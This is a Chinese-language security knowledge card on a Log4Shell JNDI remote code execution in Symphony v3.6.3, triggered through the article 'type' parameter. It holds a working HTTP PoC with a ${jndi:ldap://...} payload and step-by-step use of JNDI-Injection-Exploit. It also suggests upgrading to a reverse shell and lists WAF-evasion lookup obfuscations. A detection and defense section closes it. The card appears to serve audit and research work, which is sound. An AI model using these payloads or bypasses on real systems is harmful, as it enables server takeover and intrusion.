---
id: web-java-framework-symphony-article-type-log4j2-jndi-rce
title: Symphony v3.6.3 文章类型参数触发 Log4j2 2.13.2 JNDI RCE：type 非整型进 WARN 日志，/post?type=${jndi:...}&tags=1
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: symphony-article-type-log4j2-jndi-lookup
aliases:
- Symphony RCE
- Symphony 代码审计
- ArticleProcessor showAddArticle
- log4j-core 2.13.2
- CNVD-2024-07401
- type 参数 JNDI
- Gets article type error
tags:
- java
- log4j2
- jndi
- ldap
- rce
- log4shell
- code-audit
- symphony
cve:
- CVE-2021-44228
affected_versions: Symphony v3.6.3（内置 log4j-core 2.13.2）
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V530
  verified_at: '2026-11-11T16:58:37+08:00'
  notes: 已对照原文全文与全部8张图（GIF含第0/26/52帧）核对。版本：原文审计源码为 github 88250/symphony tags/v3.6.3.zip，正文小标题明确 log4j-core:2.13.2，affected_versions『Symphony v3.6.3（内置 log4j-core 2.13.2）』与原文一致，属原文明确标记而非猜测。漏洞点：ArticleProcessor.showAddArticle 中 String type=context.param(Common.TYPE)，非空进入 Integer.valueOf，catch 分支 LOGGER.log(Level.WARN, "Gets article type error ["+type+"]") 原样记录（图04/05），与卡片一致。级别：log4j2.xml root level=Info（intLevel 400），WARN=300 更严重会被记录（图03为 Log4j 级别表；原文『大于等于 intLevel』表述本身不严谨，卡片按 Log4j2 语义描述正确）。路由：register() 中 Dispatcher.get("/post", articleProcessor::showAddArticle, loginCheck::handle, csrfMiddleware::handle)（图06），需登录；原文明确构造请求需带 tags 参数（图04/正文）。PoC：GET /post?type=${jndi:ldap://127.0.0.1:1389/e3ccbf}&tags=1（GIF 第0帧请求与正文 payload 一致）、JNDI-Injection-Exploit -C calc.exe -A 127.0.0.1 输出 ldap://127.0.0.1:1389/e3ccbf（图07）、第26帧弹出计算器证明打通。JDK1.8.0_181 属原文环境（trustURLCodebase true，图07标注），卡片将其作为前置条件而非 Symphony 版本，正确。dedup：recommendation=new，top 候选 web-java-deserialization-jndi-log4j2-login-rce 为通用登录参数触发同
    CVE 卡，与本卡产品/入口/前置条件不同，非同链；dup-scan 无涉及本卡 pair。CVE-2021-44228 标注正确（原文引用 CNVD-2024-07401 与 CVE-2021-44228 教程）。原文为文章无独立 sources 字段惯例，未改。未运行项目与 PoC。
---

## 一句话结论

Symphony v3.6.3 使用 log4j-core 2.13.2；文章发布页 `ArticleProcessor.showAddArticle()` 把请求参数 `type` 交给 `Integer.valueOf`，解析失败时用 `LOGGER.log(Level.WARN, "Gets article type error [" + type + "]", e)` 原样记录该值，Log4j2 随即对 `${jndi:...}` 求值；登录用户请求 `GET /post?type=${jndi:ldap://attacker:1389/e3ccbf}&tags=1` 即可触发 JNDI 远程类加载并执行命令（原文演示弹出计算器）。

## 原理

- **Log4j2 Lookup**：2.13.2 属于受 Log4Shell 影响版本（< 2.15.0-rc2）。日志消息中的 `${jndi:ldap://...}` 会被 Lookup 求值，目标 JVM 连接攻击者 LDAP/RMI 服务并加载远程类。
- **可控输入进入日志**：`showAddArticle` 中 `final String type = context.param(Common.TYPE);`，非空时进入 `try { articleType = Integer.valueOf(type); } catch (Exception e) { LOGGER.log(Level.WARN, "Gets article type error [" + type + "]", e); }`。攻击者把 type 传成 `${jndi:...}` 必然触发 NumberFormatException，原始字符串被拼进日志消息。
- **级别可达**：`log4j2.xml` 的 root level 为 `Info`（intLevel 400）；调用的是 `WARN`（300），比 Info 更严重，会被 root 记录，因此异常分支的日志一定输出到 Log4j2，从而进入 Lookup。
- **路由与前置条件**：`Dispatcher.get("/post", articleProcessor::showAddArticle, loginCheck::handle, csrfMiddleware::handle)`，即 `/post` 需要登录（CSRF 中间件也在链上）；原文说明构造请求时还需给 `tags` 参数传值才能走到漏洞代码，因此 payload 为 `?type=...&tags=1`。
- **JNDI 利用链**：本地启动 JNDI-Injection-Exploit（示例 `-C "calc.exe" -A 127.0.0.1`），拿到 LDAP/RMI 链接；请求触发后目标加载远程类并执行命令。原文环境 JDK 1.8.0_181，`trustURLCodebase` 默认为 true，远程 codebase 可用（JDK 8u191+ 需换本地 gadget）。

## 触发条件

- 目标运行 Symphony v3.6.3（或内置 log4j-core < 2.15.0-rc2 的相近版本）；
- 攻击者能注册并登录（Symphony 注册需邮件配置可用），或已有有效会话；
- `GET /post` 可达，`type` 参数可控且 `tags` 非空（按原文要求）；
- 目标可出站访问攻击者的 LDAP/RMI/HTTP 服务；JDK 允许远程 codebase 或存在可用本地 gadget。

## 利用步骤

1. 按官方指南初始化数据库与邮件配置，运行 `org.b3log.symphony.Server#main()`（审计/复现环境）；
2. 确认 `log4j2.xml` root level 为 Info，确认 `showAddArticle` 的 type 异常分支会以 WARN 记录原始输入；
3. 注册用户并登录，获取有效 Cookie（`sym-ce`/`LATKE_SESSION_ID` 等）；
4. 启动 JNDI-Injection-Exploit：`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc.exe" -A 127.0.0.1`，记录生成的 `ldap://127.0.0.1:1389/xxxx`；
5. 发送 `GET /post?type=${jndi:ldap://127.0.0.1:1389/e3ccbf}&tags=1`，携带登录 Cookie；
6. 观察目标发起 LDAP 请求并执行命令（原文 GIF 中弹出计算器），可换成反弹 Shell/任意命令。

## PoC

```http
GET /post?type=${jndi:ldap://127.0.0.1:1389/e3ccbf}&tags=1 HTTP/1.1
Host: localhost:8080
Cookie: sym-ce=<登录会话>; LATKE_SESSION_ID=<登录会话>
User-Agent: Mozilla/5.0
```

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc.exe" -A 127.0.0.1
# 输出示例：
# ldap://127.0.0.1:1389/e3ccbf
```

## 变体与关联

- 同一思路可审计其他把用户可控值写入日志的调用点：原文列出 8 种参数可控 logger 形式（fatal/error/warn/info 与 `logger.log(Level.X, ...)`），搜索业务代码中进入这些调用的请求参数、Header、UA 等；
- WAF 拦截 `${jndi:` 时可用 Log4j2 lookup 混淆（`${${lower:j}ndi:...}`、`${::-${...}}` 等）；
- 目标 JDK 为 8u191+ 时，远程 codebase 被禁，需要改用 Tomcat/Spring 等 classpath 本地 gadget 或二次反序列化；
- 与库内 `web-java-deserialization-jndi-log4j2-login-rce` 对比：后者是登录用户名参数触发的通用 Log4j2 JNDI RCE；本卡是 Symphony v3.6.3 的具体代码审计入口（ArticleProcessor type 非整型异常分支 + /post 登录路由 + tags 前置参数），产品、触发参数与版本不同。

## 检测与防御

- 升级 log4j-core 至 2.17.1+（或至少 2.15.0-rc2），移除/禁用 JndiLookup（`-Dlog4j2.formatMsgNoLookups=true` 仅缓解旧版）；
- 全局排查把用户输入拼入日志的位置，避免原始参数直接进入日志消息；
- 网络侧禁止应用出站访问不明 LDAP/RMI 服务，监控 JNDI 外连；
- WAF/日志审计检测 `${jndi:`、`${lower:` 等 Lookup 特征；对 /post 等入口的参数做类型校验与白名单。
